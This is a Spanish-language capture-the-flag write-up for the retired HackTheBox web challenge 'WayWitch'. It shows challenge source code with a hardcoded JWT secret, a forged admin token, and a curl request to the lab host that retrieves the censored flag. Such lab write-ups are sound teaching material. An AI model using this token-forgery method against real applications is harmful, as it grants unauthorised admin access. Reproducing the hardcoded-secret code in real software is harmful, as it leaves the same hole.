---
layout: ctf
title: "WayWitch"
date: 2025-09-18
category: "Web"
description: "Falsificación de Json Web Tokens"

---


# Way Witch 

Este es un reto web retirado de HackTheBox diseñado para enseñar los fundamentos de la falsificación de tokens JWT (JSON Web Tokens). El objetivo principal es comprender cómo identificar y explotar vulnerabilidades relacionadas con secretos JWT débiles o hardcodeados en aplicaciones web reales.

## Análisis Inicial

La descripción del reto nos da varias pistas sobre la vulnerabilidad:Hidden in the shadows, a coven of witches communicates through arcane tokens, their messages cloaked in layers of dark enchantments. These enchanted tokens safeguard their cryptic conversations, masking sinister plots that threaten to unfold under the veil of night. However, whispers suggest that their protective spells are flawed, allowing outsiders to forge their own charms. Can you exploit the weaknesses in their mystical seals, craft a token of your own, and infiltrate their circle to thwart their nefarious plans before the next moon rises?
- "tokens arcanos" → Tokens de autenticación (probablemente JWT)
- "hechizos protectores defectuosos" → Vulnerabilidad en la validación de tokens
- "forjan sus propios hechizos" → Ataque de falsificación de tokens
- "crear un token propio" → Necesitamos crear un token malicioso

## Reconocimiento

### Análisis de la Aplicación Web
Primero, accedí a la aplicación web y descubrí:
- Un sistema de envío de tickets llamado "WitchWay"
- JavaScript genera automáticamente tokens JWT para usuarios invitados
- La aplicación usa cookies para almacenar tokens de sesión

![Interfaz principal de la aplicación]({{site.baseurl}}/assets/images/way/interfaz.png)
### Revisión del Código Fuente
El reto proporcionó archivos de código fuente que revelaron la estructura de la aplicación:
- Backend **Node.js/Express**
- Base de datos **SQLite** con tickets
- Sistema de autenticación **JWT**

#### Análisis de Archivos Clave

**`util.js` - La Vulnerabilidad Crítica**
```javascript
const jwt = require("jsonwebtoken");

function getUsernameFromToken(token) {
  const secret = "halloween-secret"; // ← SECRETO HARDCODEADO!
  
  try {
    const decoded = jwt.verify(token, secret);
    return decoded.username;
  } catch (err) {
    throw new Error("Invalid token: " + err.message);
  }
}
```

**¡El secreto JWT está hardcodeado!** Esto es una vulnerabilidad crítica que permite la falsificación de tokens.

**`routes/index.js` - Control de Acceso**
```javascript
router.get("/tickets", async (req, res) => {
  const sessionToken = req.cookies.session_token;
  
  if (!sessionToken) {
    return res.status(401).json(response("No session token provided"));
  }
  
  try {
    const username = getUsernameFromToken(sessionToken);
    
    if (username === "admin") { // ← Solo admins pueden ver tickets
      try {
        const tickets = await db.get_tickets();
        return res.status(200).json({ tickets });
      } catch (err) {
        return res.status(500).json(response("Error fetching tickets: " + err.message));
      }
    } else {
      return res.status(403).json(response("Access denied. Admin privileges required."));
    }
  } catch (err) {
    return res.status(400).json(response(err.message));
  }
});
```

**`database.js` - La Flag Objetivo**
```javascript
await this.db.exec(`
  INSERT INTO tickets (name, username, content) VALUES
  ('Admin', 'admin', 'Top secret: The Halloween party is at the haunted mansion this year. Use this code to enter ${flag}'),
  // ... otros tickets
`);
```

La flag está en el contenido del ticket del usuario 'admin'.
Capturamos nuestro token de sesion con el que luego vamos a forjar el de admin

![token usuario]({{site.baseurl}}/assets/images/way/token.png)

## Identificación de la Vulnerabilidad


La aplicación comete varios errores críticos:
1. **Secreto JWT hardcodeado** en el código fuente
2. **Mismo secreto usado en frontend** (visible en el JavaScript del cliente)
3. **Control de acceso basado únicamente en el contenido del JWT**

## Explotación

### Paso 1: Generación del Token Malicioso

Usando la información obtenida del código fuente, creamos un JWT malicioso:

**Herramientas utilizadas:**
- jwt.io (online JWT generator)
- Secreto conocido: `halloween-secret`

**Payload del JWT:**
```json
{
  "username": "admin",
  "iat": 1758213146
}
```

**Token generado:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzU4MjEzMTQ2fQ.VOACMe_yhFP9PhzZlKyqd-2A-zfQf9330OOV0hhVHx0
```

![Generación del token en jwt.io]({{site.baseurl}}/assets/images/way/token_admin.png)

### Paso 2: Acceso a los Tickets

Realizamos una petición al endpoint `/tickets` usando el token falsificado:

```bash
curl -k "https://94.237.48.12:31749/tickets" \
     -H "Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzU4MjEzMTQ2fQ.VOACMe_yhFP9PhzZlKyqd-2A-zfQf9330OOV0hhVHx0"
```

![Comando curl y respuesta]({{site.baseurl}}/assets/images/way/curl.png)

### Paso 3: Obtención de la Flag

La respuesta del servidor revela todos los tickets, incluyendo el del admin que contiene la flag:

```json
{
  "tickets": [
    {
      "id": 3,
      "name": "Admin",
      "username": "admin", 
      "content": "Top secret: The Halloween party is at the haunted mansion this year. Use this code to enter HTB{***CENSURADA***}\n"
    }
    // ... otros tickets
  ]
}
```
## Información sobre Json Web token:

[Informacion de Json Web token en español](https://openwebinars.net/blog/que-es-json-web-token-y-como-funciona/)

## Conclusión

Un reto muy diverto de Xclow3n que representa una vulnerabilidad real y común en aplicaciones web que usan JWT. La facilidad de explotación (una vez identificada la vulnerabilidad) resalta la importancia de implementar prácticas de seguridad adecuadas desde el desarrollo.


